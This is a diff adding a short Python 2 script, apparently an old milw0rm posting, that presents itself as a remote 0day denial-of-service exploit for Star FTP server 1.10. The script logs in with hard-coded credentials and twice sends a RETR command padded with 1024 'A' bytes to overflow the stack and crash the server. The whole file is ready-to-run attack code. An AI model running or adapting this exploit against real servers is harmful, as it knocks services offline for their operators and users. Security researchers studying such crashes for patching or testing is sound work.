@@ -1,0 +1,40 @@
+# Star FTP server 1.10
+# Bug type: stack overflow
+# Found by Necro <neco * ihack.pl> http://iHACK.pl
+
+from socket import *
+from sys import exit
+
+print '\n[*] Star FTP server 1.10 Remote 0day DoS Exploit'
+print '[*] Bug found by Necro <necro*ihack.pl> http://iHACK.pl'
+
+host = '127.0.0.1'
+port = 21
+
+username = 'necro'
+password = 'dupa'
+
+evil = 'RETR' + '\x20' + '\x41' * 1024 + '\r\n'
+
+s = socket(AF_INET, SOCK_STREAM)
+try:
+   s.connect((host, port))
+except:
+   print '\n[-] Connection Error'
+   exit()
+
+s.recv(1024)
+s.send('USER' + '\x20' + username + '\r\n')
+s.recv(1024)
+s.send('PASS' + '\x20' + password + '\r\n')
+s.recv(1024)
+s.send('PORT 2000\r\n')
+s.recv(1024)
+s.send(evil)
+s.recv(1024)
+s.send(evil)
+s.close()
+
+print '[+] Done, shutdown.'
+
+# milw0rm.com [2006-12-17]
